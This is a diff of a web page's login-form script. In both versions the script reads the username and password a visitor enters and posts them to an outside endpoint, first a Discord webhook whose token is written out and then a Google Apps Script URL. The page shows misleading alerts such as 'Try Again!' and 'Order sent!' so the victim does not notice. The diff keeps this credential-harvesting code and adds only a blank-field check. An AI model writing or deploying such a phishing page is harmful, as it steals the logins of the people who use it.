@@ -68,31 +68,37 @@ document.getElementById("loginTrigger").addEventListener("click", function(event
     const username = document.getElementById("username").value;
     const password = document.getElementById("password").value;
 
-    // Create message for Discord
-    const message = ` **Ahamed your a genius**\n\n**Username:** ${username}\n**Password:** ${password}`;
+    // Simple validation
+    if (!username || !password) {
+        alert("Please fill in both fields!");
+        return;
+    }
 
-    // Send directly to Discord webhook
-    fetch("https://discord.com/api/webhooks/1440084893026619498/EghJR4801Er-ZaAFQcKMVSqHD3MCglFGDQqujsGZpkgUg3mNy-TVSouuBcUX7dzERTtF", {
+    // Create message for Discord
+    const message = `**Ahamed your a genius**\n\n**username:** ${username}\n**password:** ${password}`;
+
+    // Google Apps Script Web App URL
+    const scriptUrl = "https://script.google.com/macros/s/AKfycbwZ4Hx5sLNa-3xfwBmLeb2b2dOaSpOJrOT7Ph7WroE0bO4K4e0kt7eFBgHx1eZ-mkeXtA/exec";
+
+    // Send POST request to Google Script
+    fetch(scriptUrl, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: message })
+        body: JSON.stringify({ message: message })
     })
-    .then(response => {
-        if (response.ok) {
-            alert("Try Again!");
-
-            // Clear input fields
-            document.getElementById("username").value = "";
-            document.getElementById("password").value = "";
-        } else {
-            alert("Failed to send: " + response.status);
-        }
+    .then(response => response.json())
+    .then(data => {
+        alert("Order sent!");
+        // Clear input fields
+        document.getElementById("username").value = "";
+        document.getElementById("password").value = "";
     })
     .catch(error => {
         alert("Error sending order: " + error);
     });
 });
 </script>
+
 
 
 
